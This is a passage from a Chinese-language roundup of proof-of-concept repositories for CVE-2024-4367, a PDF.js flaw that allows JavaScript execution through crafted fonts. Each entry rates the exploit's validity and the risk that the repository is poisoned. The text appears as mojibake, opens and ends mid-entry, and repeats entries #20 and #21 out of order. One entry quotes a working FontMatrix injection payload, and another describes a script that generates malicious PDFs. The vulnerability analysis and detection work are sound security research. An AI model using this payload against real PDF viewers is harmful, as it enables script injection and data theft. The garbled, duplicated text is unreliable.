æä¾›çš„POCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«:
*   å®šä¹‰äº†ä¸€ä¸ªShading Patternï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªFunctionï¼Œè¯¥Functionç”¨äºç”Ÿæˆé¢œè‰²ï¼ŒåŒ…å«/C0[0 0 1]å’Œ/C1[1 0.6 0]ï¼Œå®šä¹‰äº†ä»è“åˆ°æ©™è‰²çš„é¢œè‰²æ¸å˜
*   å®šä¹‰äº†ä¸€ä¸ªFontï¼Œå…¶ä¸­FontMatrixçš„å€¼ä¸º`[0.1 0 0 0.1 0 (1\); alert\('vprr')]`ï¼Œå…¶ä¸­åŒ…å«äº†åµŒå…¥çš„JavaScriptä»£ç `alert('vprr')`
*   å®šä¹‰äº†ä¸€ä¸ªPageï¼ŒContents ä½¿ç”¨äº†å®šä¹‰çš„ Shading Pattern å’Œ Fontï¼Œé€šè¿‡åœ¨PDFæ–‡æ¡£ä¸­ç»˜åˆ¶æ–‡æœ¬ï¼Œä¼šè§¦å‘å­—ä½“æ¸²æŸ“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“ä¸­çš„JavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œè¯¥POCåˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ï¼Œé€šè¿‡åœ¨FontMatrixä¸­åµŒå…¥JavaScriptä»£ç ï¼ŒæˆåŠŸå®ç°äº†ä»»æ„JavaScriptä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œè¯¥POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡ŒJavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚è™½ç„¶POCæœ¬èº«ä¸åŒ…å«æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½†å¦‚æœæ”»å‡»è€…åœ¨å®é™…æ”»å‡»ä¸­ï¼Œå¯èƒ½ä¼šå°†è­¦å‘Šæ¡†æ›¿æ¢ä¸ºæ›´éšè”½çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚å› æ­¤åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚ ä¸»è¦æ˜¯è€ƒè™‘äº†ä½œè€…å¯èƒ½å°†alertä¿¡æ¯æ›¿æ¢ä¸ºå…¶ä»–payloadã€‚ä½†å°±ç›®å‰æ¥çœ‹ï¼Œè¯¥PDF ä»…ä»…æ˜¯æ¼æ´éªŒè¯ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [pedrochalegre7/CVE-2024-4367-pdf-sample](https://github.com/pedrochalegre7/CVE-2024-4367-pdf-sample)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #21

**æ¥æº**: [CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md)

## CVE-2024-4367 PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼Œæˆ–åœ¨ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ã€‚è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ï¼Œåœ¨ FontMatrix ä¸­æ’å…¥æ¶æ„ JavaScript ä»£ç ã€‚
2.  å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR, æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  åˆ©ç”¨ä»£ç  `poc.py` å¯ä»¥è‡ªåŠ¨åŒ–ç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç ç›´æ¥ç”ŸæˆåŒ…å«åµŒå…¥çš„ JavaScript ä»£ç çš„ PDFï¼Œå¹¶åˆ©ç”¨æ¼æ´æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**

åˆ†ææä¾›çš„ `poc.py` å’Œ `malicious.pdf` æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`poc.py` çš„ä½œç”¨æ˜¯ç”ŸæˆåŒ…å«æŒ‡å®š JavaScript payload çš„ PDF æ–‡ä»¶ï¼Œè€Œ `malicious.pdf` æ˜¯ä¸€ä¸ªå·²ç»ç”Ÿæˆå¥½çš„ç¤ºä¾‹ PDFã€‚ ä»“åº“çš„README.mdä¹Ÿæè¿°äº†å¦‚æœä½¿ç”¨pythonè„šæœ¬ç”ŸæˆPDFã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [s4vvysec/CVE-2024-4367-POC](https://github.com/s4vvysec/CVE-2024-4367-POC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #22

**æ¥æº**: [CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md)

## CVE-2024-4367 - Mozilla Firefox, Firefox ESR, Thunderbird PDF.js JavaScript Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScript ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Mozilla Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„ PDF æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´æ˜¯ Mozilla Firefox, Firefox ESR, Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨æˆ– Thunderbird æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ¥çœ‹ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæœ¬åœ°çš„å¼€å‘ç¯å¢ƒæ¥éªŒè¯å’Œæµ‹è¯•åˆ©ç”¨æ­¤æ¼æ´çš„ PDF æ–‡ä»¶ã€‚ è¯¥ POC ä»£ç åŒ…å«ä¸€ä¸ªç”¨äºæ¼”ç¤ºæ¼æ´åˆ©ç”¨çš„ Web æœåŠ¡å™¨ï¼Œå¹¶æä¾›ä¸åŒå‰ç«¯æ¡†æ¶ï¼ˆReact, Vue, Svelteï¼‰çš„ç»„ä»¶ã€‚é€šè¿‡ä¿®æ”¹ç»„ä»¶æŒ‡å‘çš„ PDF æ–‡ä»¶ï¼Œå¯ä»¥æµ‹è¯•ä¸åŒçš„æ”»å‡»è½½è·ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼ˆç‰¹åˆ«æ˜¯ GitHub ä¸Šçš„ POC ä»“åº“ï¼‰ï¼Œè¯¥æ¼æ´è¢«ç¡®è®¤å­˜åœ¨ä¸”æœ‰å¯ç”¨çš„ POC ä»£ç ã€‚ POC ä»£ç æä¾›äº†ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå¯ä»¥ç”¨æ¥éªŒè¯æ¼æ´åˆ©ç”¨ã€‚ å› æ­¤ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**

åˆ†ææä¾›çš„ä»£ç ä»“åº“ï¼Œå‘ç°è¯¥ä»“åº“ä¸»è¦æ˜¯ä¸ºäº†æ¼”ç¤ºå’ŒéªŒè¯ CVE-2024-4367 æ¼æ´ï¼Œæœ¬èº«æä¾›äº† react, vue, svelte ä¸‰ç§æ¡†æ¶æ¥æ¼”ç¤ºæ¼æ´ï¼Œä»£ç æœ¬èº«ç›¸å¯¹æ¸…æ™°ã€‚ å­˜åœ¨çš„é£é™©æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç æ‰§è¡Œï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æµ‹è¯• PDF æ–‡ä»¶æˆ–è€…å‰ç«¯ä»£ç ï¼ˆè™½ç„¶ä¸å¤ªå®¹æ˜“ï¼‰æ¥å¼•å…¥æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°æŠ•æ¯’æ”»å‡»ã€‚ å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†ä¸»è¦é›†ä¸­åœ¨ä½¿ç”¨è¯¥ POC ä»£ç æ—¶ï¼Œç”¨æˆ·éœ€è¦æ£€æŸ¥å’ŒéªŒè¯æ‰€ä½¿ç”¨çš„ PDF æ–‡ä»¶å’Œå‰ç«¯ä»£ç çš„å®‰å…¨æ€§ã€‚ ä»£ç æ¡†æ¶è¾ƒä¸ºè§„èŒƒï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½œè€…å¯èƒ½åªæ˜¯æƒ³æ¼”ç¤ºæ¼æ´ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ¶æ„æ´»åŠ¨ã€‚ è€ƒè™‘åˆ°è¿™äº›å› ç´ ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æ:**

1.  **æ¼æ´æ ¹æºï¼š** PDF.js åœ¨å¤„ç† PDF æ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ–¹å¼ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
3.  **æ”»å‡»è¿‡ç¨‹ï¼š**
    *   ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ¶æ„ PDF æ–‡ä»¶ã€‚
    *   PDF.js è§£æè¯¥ PDF æ–‡ä»¶ã€‚
    *   ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­è¢«æ‰§è¡Œã€‚
4.  **æ”»å‡»ç»“æœï¼š** æ¶æ„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡Œä»»æ„ä»£ç ç­‰ã€‚ ç”±äº PDF.js è¿è¡Œåœ¨æµè§ˆå™¨çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸æ— æ³•ç›´æ¥è®¿é—®æ“ä½œç³»ç»Ÿçš„åº•å±‚èµ„æºã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬å¯èƒ½é€šè¿‡å…¶ä»–æ¼æ´æˆ–åˆ©ç”¨æµè§ˆå™¨çš„åŠŸèƒ½æ¥æå‡æƒé™ã€‚

**é¡¹ç›®åœ°å€:** [snyk-labs/pdfjs-vuln-demo](https://github.com/snyk-labs/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #23

**æ¥æº**: [CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md](../2024/CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è·¨ç«™è„šæœ¬æ”»å‡»

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å­—ä½“å¤„ç†æ—¶çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å­˜åœ¨ï¼Œå¹¶ä¸”æœ‰POCå¯ç”¨ï¼ˆ[webpage 6] æåˆ°äº† `exfil0/WEAPONIZING-CVE-2024-4367`ï¼Œæä¾›äº†åˆ©ç”¨ä»£ç ï¼‰ã€‚æä¾›çš„YARAè§„åˆ™å¯ä»¥ç”¨äºæ£€æµ‹åˆ©ç”¨æ­¤æ¼æ´çš„PDFæ–‡ä»¶ï¼Œè¡¨æ˜POCçš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ä»£ç åŒ…å«ä¸€ä¸ªYARAè§„åˆ™ï¼Œç”¨äºæ£€æµ‹åˆ©ç”¨CVE-2024-4367çš„PDFæ–‡ä»¶ã€‚LICENSEå’ŒREADMEæ–‡ä»¶æ˜¯æ ‡å‡†çš„å¼€æºé¡¹ç›®æ–‡ä»¶ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©æä½ï¼Œä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨äº† PDF.js ä¸­å­—ä½“å¤„ç†æ—¶ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥ã€‚
2.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„å­—ä½“æ•°æ®ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ‰§è¡Œçš„ JavaScript ä»£ç å¯ä»¥è®¿é—® PDF.js çš„å†…éƒ¨å¯¹è±¡å’Œå‡½æ•°ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œï¼Œå¦‚è·¨ç«™è„šæœ¬æ”»å‡»(å¦‚æœPDF.jsè¢«åµŒå…¥åœ¨ç½‘é¡µä¸­)ã€‚

æ€»çš„æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æ„é€ åŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œè§¦å‘ JavaScript ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [spaceraccoon/detect-cve-2024-4367](https://github.com/spaceraccoon/detect-cve-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---



---

## POC #20

**æ¥æº**: [CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md](../2024/CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefox, Firefox ESR, Thunderbirdä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå­˜åœ¨äºPDF.jsä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„PDFæ–‡æ¡£ã€‚
2.  è¯¥PDFæ–‡æ¡£åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨PDF.jså­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€æ­¤PDFæ–‡æ¡£æ—¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ¶æ„å­—ä½“æ•°æ®ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼ŒPDF.jsä¼šæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“æ•°æ®ä¸­çš„æ¶æ„JavaScriptä»£ç ã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¯ä»¥è¿›è¡Œè¯¸å¦‚çªƒå–ä¿¡æ¯æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚

**POCåˆ†æï¼š**

æä¾›çš„POCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«:
*   å®šä¹‰äº†ä¸€ä¸ªShading Patternï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªFunctionï¼Œè¯¥Functionç”¨äºç”Ÿæˆé¢œè‰²ï¼ŒåŒ…å«/C0[0 0 1]å’Œ/C1[1 0.6 0]ï¼Œå®šä¹‰äº†ä»è“åˆ°æ©™è‰²çš„é¢œè‰²æ¸å˜
*   å®šä¹‰äº†ä¸€ä¸ªFontï¼Œå…¶ä¸­FontMatrixçš„å€¼ä¸º`[0.1 0 0 0.1 0 (1\); alert\('vprr')]`ï¼Œå…¶ä¸­åŒ…å«äº†åµŒå…¥çš„JavaScriptä»£ç `alert('vprr')`
*   å®šä¹‰äº†ä¸€ä¸ªPageï¼ŒContents ä½¿ç”¨äº†å®šä¹‰çš„ Shading Pattern å’Œ Fontï¼Œé€šè¿‡åœ¨PDFæ–‡æ¡£ä¸­ç»˜åˆ¶æ–‡æœ¬ï¼Œä¼šè§¦å‘å­—ä½“æ¸²æŸ“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“ä¸­çš„JavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œè¯¥POCåˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ï¼Œé€šè¿‡åœ¨FontMatrixä¸­åµŒå…¥JavaScriptä»£ç ï¼ŒæˆåŠŸå®ç°äº†ä»»æ„JavaScriptä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œè¯¥POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡ŒJavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚è™½ç„¶POCæœ¬èº«ä¸åŒ…å«æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½†å¦‚æœæ”»å‡»è€…åœ¨å®é™…æ”»å‡»ä¸­ï¼Œå¯èƒ½ä¼šå°†è­¦å‘Šæ¡†æ›¿æ¢ä¸ºæ›´éšè”½çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚å› æ­¤åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚ ä¸»è¦æ˜¯è€ƒè™‘äº†ä½œè€…å¯èƒ½å°†alertä¿¡æ¯æ›¿æ¢ä¸ºå…¶ä»–payloadã€‚ä½†å°±ç›®å‰æ¥çœ‹ï¼Œè¯¥PDF ä»…ä»…æ˜¯æ¼æ´éªŒè¯ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [pedrochalegre7/CVE-2024-4367-pdf-sample](https://github.com/pedrochalegre7/CVE-2024-4367-pdf-sample)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #21

**æ¥æº**: [CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md)

## CVE-2024-4367 PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼Œæˆ–åœ¨ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ã€‚è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ï¼Œåœ¨ FontMatrix ä¸­æ’å…¥æ¶æ„ JavaScript ä»£ç ã€‚
2.  å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR, æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  åˆ©ç”¨ä»£ç  `poc.py` å¯ä»¥è‡ªåŠ¨åŒ–ç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚

**æœ‰æ•ˆæ€§ï¼š**

